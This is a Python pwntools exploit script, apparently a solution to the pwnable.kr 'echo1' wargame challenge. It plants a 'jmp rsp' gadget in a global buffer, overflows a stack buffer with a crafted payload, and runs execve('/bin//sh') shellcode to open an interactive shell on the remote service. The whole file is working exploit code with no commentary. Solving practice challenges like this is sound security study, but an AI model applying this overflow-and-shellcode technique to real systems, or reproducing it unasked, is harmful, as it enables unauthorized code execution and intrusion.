from pwn import *

def DEBUG():
	gdb.attach(r, '''
					b *0x400871
					c
		 		  ''')

context.arch='amd64'
buf = 0x6020a0

sh = asm('''
	push   rax
	xor    rdx, rdx
	xor    rsi, rsi
	movabs rbx, 0x68732f2f6e69622f
	push   rbx
	push   rsp
	pop    rdi
	mov    al, 0x3b
	syscall
	'''
)

#r = process('./echo1')
r = remote('pwnable.kr', 9010)
#DEBUG()
r.recvuntil(' : ')
r.sendline(asm("jmp rsp", arch='amd64', os='linux'))
r.recvuntil('>')
r.sendline('1')
sleep(0.5)
payload = 'a'*0x28 + p64(buf) + sh
r.sendline(payload)

r.interactive()
